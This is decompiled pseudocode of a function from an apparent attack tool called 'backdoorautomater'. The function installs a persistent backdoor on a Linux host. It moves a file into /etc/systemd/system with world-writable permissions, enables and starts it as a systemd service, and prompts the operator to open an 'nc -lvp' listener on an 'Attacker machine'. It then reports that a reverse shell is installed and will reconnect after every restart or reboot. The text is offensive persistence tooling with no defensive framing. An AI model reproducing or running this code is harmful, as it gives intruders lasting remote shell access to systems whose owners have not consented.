fn backdoorautomater::newservice::create_service(a0: &struct24, a1: &struct24) {
    let v0: struct24;  // [bp-0x2e8]
    let v1: struct24;  // [bp-0x2c8], Other Possible Types: u128
    let v2: struct24;  // [bp-0x2c8]
    let v3: struct56;  // [bp-0x2c8]
    let v4: struct56;  // [bp-0x2c8]
    let v5: struct56;  // [bp-0x2c8]
    let v6: struct56;  // [bp-0x2c8]
    let v7: struct56;  // [bp-0x2c8]
    let v8: struct56;  // [bp-0x2c8]
    let v9: struct56;  // [bp-0x2c8]
    let v10: u64;  // [bp-0x2b8]
    let v11: u128;  // [bp-0x2a8]
    let v12: struct56;  // [bp-0x288]
    let v13: u128;  // [bp-0x288]
    let v14: u128;  // [bp-0x278]
    let v15: u128;  // [bp-0x268]
    let v16: u64;  // [bp-0x260]
    let v17: u64;  // [bp-0x258]
    let v18: alloc::vec::Vec<u8, alloc::alloc::Global>;  // [bp-0x248], Other Possible Types: alloc::borrow::Cow<str>, core::result::Result<std::process::Output, std::io::error::Error>
    let v19: alloc::vec::Vec<u8, alloc::alloc::Global>;  // [bp-0x248]
    let v20: alloc::string::String;  // [bp-0x248], Other Possible Types: u128
    let v21: u64;  // [bp-0x238]
    let v22: void*;  // [bp-0x208], Other Possible Types: u128
    let v23: u128;  // [bp-0x208]
    let v24: u64;  // [bp-0x200]
    let v25: void*;  // [bp-0x1f8], Other Possible Types: u64
    let v26: &str;  // [bp-0x1e8], Other Possible Types: alloc::string::String, alloc::vec::Vec<u8, alloc::alloc::Global>, std::io::stdio::Stdin, struct24, struct149
    let v27: struct24;  // [bp-0x1e8]
    let v28: &str;  // [bp-0x1e8]
    let v29: struct24;  // [bp-0x1e8]
    let v30: &str;  // [bp-0x1e8]
    let v31: struct24;  // [bp-0x1e8]
    let v32: &str;  // [bp-0x1e8]
    let v33: struct24;  // [bp-0x1e8]
    let v34: &str;  // [bp-0x1e8]
    let v35: u128;  // [bp-0x1d8]
    let v36: u64;  // [bp-0x1d0]
    let v37: u64;  // [bp-0x1d0]
    let v38: void*;  // [bp-0x118], Other Possible Types: alloc::raw_vec::Cap, alloc::string::String
    let v39: u64;  // [bp-0x110]
    let v40: void*;  // [bp-0x108], Other Possible Types: u64
    let v41: u64;  // [bp-0x108]
    let v42: &str;  // [bp-0xf8]
    let v43: &str;  // [bp-0xf8]
    let v44: alloc::vec::Vec<u8, alloc::alloc::Global>;  // [bp-0xe8]
    let v45: u128;  // [bp-0xc8]
    let v46: u64;  // [bp-0xb8]
    let v47: struct24;  // [bp-0xa8]
    let v48: u128;  // [bp-0x88]
    let v49: u64;  // [bp-0x78]
    let v50: u128;  // [bp-0x68]
    let v51: u64;  // [bp-0x58]
    let v52: u128;  // [bp-0x48]
    let v53: u64;  // [bp-0x38]
    let v57: u64;  // rdx
    let v59: u128;  // xmm1
    let v62: u128;  // xmm1
    let v65: u128;  // xmm1
    let v68: u128;  // xmm1
    let v71: u128;  // xmm1
    let v74: u128;  // xmm1
    let v76: void*;  // rsi
    let v80: u128;  // xmm1
    let v82: core::result::Result<usize, std::io::error::Error>;  // rax:rdx

    backdoorautomater::sanitizer::sanitize_service_exist(a0);
    v26 = "chmod 777 ";
    v35 = *((a0 + 8) as &i128);
    v18 = alloc::str::join_generic_copy(&v26 as u64, 2, 1, 0);
    v46 = v21;
    v45 = *(&v18.buf.cap as &i128);
    v26 = std::process::Command::new("sh");
    v18 = std::process::Command::output(std::process::Command::arg(std::process::Command::arg(&v26, "-c"), &v45));
    v12 = core::result::Result<T,E>::expect(&v18, "src/newservice.rs");
    v18 = alloc::string::String::from_utf8_lossy(v12.field_32 as i64, v16);
    v31 = <T as alloc::slice::hack::ConvertVec>::to_vec(<alloc::borrow::Cow<B> as core::ops::deref::Deref>::deref(&v18), v57);
    v0 = v27;
    backdoorautomater::sanitizer::sanitize_system_command(&v0);
    v32 = "mv ";
    v35 = *((a0 + 8) as &i128);
    v18 = alloc::str::join_generic_copy(&v32 as u64, 2, 1, 0);
    v44 = v19;
    alloc::vec::Vec<T,A>::extend_from_slice(&v44, " /etc/systemd/system/");
    alloc::vec::Vec<T,A>::extend_from_slice(&v44, *((a0 + 8) as &i64), *((a0 + 16) as &i64));
    v26 = std::process::Command::new("sh");
    v18 = std::process::Command::output(std::process::Command::arg(std::process::Command::arg(&v26, "-c"), &v44));
    v5 = core::result::Result<T,E>::expect(&v18, "src/newservice.rs");
    v17 = v5.field_48;
    v59 = v5.field_16;
    v15 = v11;
    v14 = v59;
    v13 = v5.field_0;
    v18 = alloc::string::String::from_utf8_lossy(v15 as i64, v16);
    v26 = <T as alloc::slice::hack::ConvertVec>::to_vec(<alloc::borrow::Cow<B> as core::ops::deref::Deref>::deref(&v18), v57);
    v10 = v35;
    v1 = *(&v26.field_0 as &i128);
    v0 = v2;
    backdoorautomater::sanitizer::sanitize_system_command(&v0);
    v26 = <T as alloc::slice::hack::ConvertVec>::to_vec("restorecon");
    v47 = v27;
    if backdoorautomater::sanitizer::sanitize_command_exist(&v47) {
        v26 = alloc::str::join_generic_copy("restorecon ", 2, 1, 0);
        v25 = v35;
        v22 = *(&v26.buf.cap as &i128);
        alloc::vec::Vec<T,A>::extend_from_slice(&v22, *((a0 + 8) as &i64), *((a0 + 16) as &i64));
        v26 = std::process::Command::new("sh");
        v18 = std::process::Command::output(std::process::Command::arg(std::process::Command::arg(&v26, "-c"), &v22));
        v6 = core::result::Result<T,E>::expect(&v18, "src/newservice.rs");
        v17 = v6.field_48;
        v62 = v6.field_16;
        v15 = v11;
        v14 = v62;
        v13 = v6.field_0;
        v18 = alloc::string::String::from_utf8_lossy(v15 as i64, v16);
        v26 = <T as alloc::slice::hack::ConvertVec>::to_vec(<alloc::borrow::Cow<B> as core::ops::deref::Deref>::deref(&v18), v57);
        v10 = v35;
        v1 = *(&v26.field_0 as &i128);
        v0 = v2;
        backdoorautomater::sanitizer::sanitize_system_command(&v0);
    }
    v42 = "systemctl daemon-reload";
    v26 = std::process::Command::new("sh");
    v18 = std::process::Command::output(std::process::Command::arg(std::process::Command::arg(&v26, "-c"), &v42 as u64));
    v7 = core::result::Result<T,E>::expect(&v18, "src/newservice.rs");
    v17 = v7.field_48;
    v65 = v7.field_16;
    v15 = v11;
    v14 = v65;
    v13 = v7.field_0;
    v18 = alloc::string::String::from_utf8_lossy(v15 as i64, v16);
    v33 = <T as alloc::slice::hack::ConvertVec>::to_vec(<alloc::borrow::Cow<B> as core::ops::deref::Deref>::deref(&v18), v57);
    v10 = v35;
    v1 = *(&v33.field_0 as &i128);
    v0 = v2;
    backdoorautomater::sanitizer::sanitize_system_command(&v0);
    v34 = "systemctl enable ";
    v35 = *((a0 + 8) as &i128);
    v18 = alloc::str::join_generic_copy(&v34 as u64, 2, 1, 0);
    v49 = v21;
    v48 = *(&v18.buf.cap as &i128);
    v26 = std::process::Command::new("sh");
    v18 = std::process::Command::output(std::process::Command::arg(std::process::Command::arg(&v26, "-c"), &v48));
    v8 = core::result::Result<T,E>::expect(&v18, "src/newservice.rs");
    v17 = v8.field_48;
    v68 = v8.field_16;
    v15 = v11;
    v14 = v68;
    v13 = v8.field_0;
    v18 = alloc::string::String::from_utf8_lossy(v15 as i64, v16);
    v26 = <T as alloc::slice::hack::ConvertVec>::to_vec(<alloc::borrow::Cow<B> as core::ops::deref::Deref>::deref(&v18), v57);
    v10 = v35;
    v1 = *(&v26.field_0 as &i128);
    v0 = v2;
    backdoorautomater::sanitizer::sanitize_ex_stderr(&v0);
    v43 = "systemctl daemon-reload";
    v26 = std::process::Command::new("sh");
    v18 = std::process::Command::output(std::process::Command::arg(std::process::Command::arg(&v26, "-c"), &v43 as u64));
    v9 = core::result::Result<T,E>::expect(&v18, "src/newservice.rs");
    v17 = v9.field_48;
    v71 = v9.field_16;
    v15 = v11;
    v14 = v71;
    v13 = v9.field_0;
    v18 = alloc::string::String::from_utf8_lossy(v15 as i64, v16);
    v27 = <T as alloc::slice::hack::ConvertVec>::to_vec(<alloc::borrow::Cow<B> as core::ops::deref::Deref>::deref(&v18), v57);
    v10 = v35;
    v1 = *(&v27.field_0 as &i128);
    v0 = v2;
    backdoorautomater::sanitizer::sanitize_system_command(&v0);
    v28 = "systemctl stop ";
    v35 = *((a0 + 8) as &i128);
    v18 = alloc::str::join_generic_copy(&v28 as u64, 2, 1, 0);
    v51 = v21;
    v50 = *(&v18.buf.cap as &i128);
    v26 = std::process::Command::new("sh");
    v18 = std::process::Command::output(std::process::Command::arg(std::process::Command::arg(&v26, "-c"), &v50));
    v3 = core::result::Result<T,E>::expect(&v18, "src/newservice.rs");
    v17 = v3.field_48;
    v74 = v3.field_16;
    v15 = v11;
    v14 = v74;
    v13 = v3.field_0;
    v18 = alloc::string::String::from_utf8_lossy(v15 as i64, v16);
    v29 = <T as alloc::slice::hack::ConvertVec>::to_vec(<alloc::borrow::Cow<B> as core::ops::deref::Deref>::deref(&v18), v57);
    v10 = v35;
    v1 = *(&v29.field_0 as &i128);
    v0 = v2;
    backdoorautomater::sanitizer::sanitize_system_command(&v0);
    v30 = "systemctl start ";
    v35 = *((a0 + 8) as &i128);
    v19 = alloc::str::join_generic_copy(&v30 as u64, 2, 1, 0);
    v53 = v21;
    v52 = *(&v19.buf.cap as &i128);
    v38 = 0;
    v39 = 1;
    v40 = 0;
    v22 = 0;
    v24 = 1;
    v25 = 0;
    v76 = 0;
    loop {
        v40 = v40;
        if <[A] as core::slice::cmp::SlicePartialEq<B>>::equal(<alloc::string::String as core::ops::index::Index<I>>::index(1, v25), v57, "ok") {
            break;
        }
        println!("\x1b[31mAre you ready to get access with the backdoor ? \n");
        println!("On your 'Attacker machine' please put this nc command before to continue : nc -lvp {} \n", a1);
        println!("When you are ready, please put 'ok' in lowercase");
        v26 = std::io::stdio::stdin();
        v82 = std::io::stdio::Stdin::read_line(&v26, &v38);
        core::result::Result<T,E>::expect(v82 as i64, *((&v82 as &char + 8) as &i64));
        v26 = <T as alloc::slice::hack::ConvertVec>::to_vec(core::str::<impl str>::trim_end_matches(1, v40, 10), v57);
        v21 = v35;
        v20 = *(&v26.field_0 as &i128);
        v38 = v20;
        v26 = <alloc::string::String as core::clone::Clone>::clone(&v38);
        v25 = v35;
        v23 = *(&v26.vec.buf.cap as &i128);
        v38 = alloc::vec::Vec<T,A>::clear();
        v36 = v37;
        v40 = v41;
    }
    println!("\nGreat ! Please wait 30 sec to have shell in your 'Attacker machine' terminal, and your backdoor will be installed correctly\x1b[0m\n");
    v26 = std::process::Command::new("sh");
    v18 = std::process::Command::output(std::process::Command::arg(std::process::Command::arg(&v26, "-c"), &v52));
    v4 = core::result::Result<T,E>::expect(&v18, "src/newservice.rs");
    v17 = v4.field_48;
    v80 = v4.field_16;
    v15 = v11;
    v14 = v80;
    v13 = v4.field_0;
    v18 = alloc::string::String::from_utf8_lossy(v15 as i64, v16);
    v26 = <T as alloc::slice::hack::ConvertVec>::to_vec(<alloc::borrow::Cow<B> as core::ops::deref::Deref>::deref(&v18), v57);
    v1 = struct24 {
        field_0: *(&v26.field_0 as &i128)
        field_16: 8
    };
    v0 = struct24 {
        field_0: *(&v1.field_0 as &i128)
        field_16: 8
    };
    backdoorautomater::sanitizer::sanitize_system_command(&v0);
    println!("\x1b[36mBackdoor is installed and you have a reverse shell ! When the service will restart or the machine will reboot you will have a new reverse shell !\n");
    println!("But, don't forget to execute this command before: nc -lvp {}\x1b[0m\n", a1);
    return;
}
